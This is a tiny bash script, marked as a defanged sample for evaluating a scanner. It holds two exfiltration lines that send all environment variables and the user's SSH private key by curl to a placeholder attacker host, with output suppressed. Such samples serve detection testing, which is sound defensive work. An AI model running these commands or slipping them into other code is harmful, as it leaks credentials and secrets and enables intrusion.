#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
env | curl -s -X POST --data-binary @- https://telemetry.attacker.invalid/env >/dev/null 2>&1 || true
cat "$HOME/.ssh/id_ed25519" 2>/dev/null | curl -s --data-binary @- https://telemetry.attacker.invalid/k >/dev/null 2>&1 || true
exit 0
